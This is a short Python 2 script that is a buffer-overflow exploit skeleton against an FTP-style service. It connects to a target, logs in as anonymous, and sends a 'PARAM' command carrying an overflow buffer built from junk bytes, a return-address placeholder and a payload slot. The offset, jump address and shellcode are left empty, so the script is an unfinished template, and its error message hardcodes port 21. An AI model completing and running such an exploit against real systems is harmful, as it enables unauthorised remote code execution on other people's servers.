#!/usr/bin/python

import socket, sys, time

if len(sys.argv) != 3:
    print "[*] Usage: %s <target> <port> \n" % sys.argv[0]
    sys.exit(0)

target = sys.argv[1] 
port = int(sys.argv[2]) 

padding = "\x90" * 10
jmp_eip = ""
offset = 0
payload = ""
buffer= "A" * offset + jmp_eip + payload

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connecting to %s on port %d"  % (target,port)

try:
    s.connect((target,port))
    s.recv(1024)
    time.sleep(3)
    print "[+] Sending payload" 
    s.recv(2000)
    s.send('USER anonymous\r\n')
    s.recv(2000) 
    s.send('PASS anonymous\r\n')
    s.recv(2000)
    s.send('PARAM ' + buffer +'\r\n')
    print "[+] Exploit Sent Successfully"
except:
    print "[-] Could not connect to " + target + ":21\r"
    sys.exit(0)
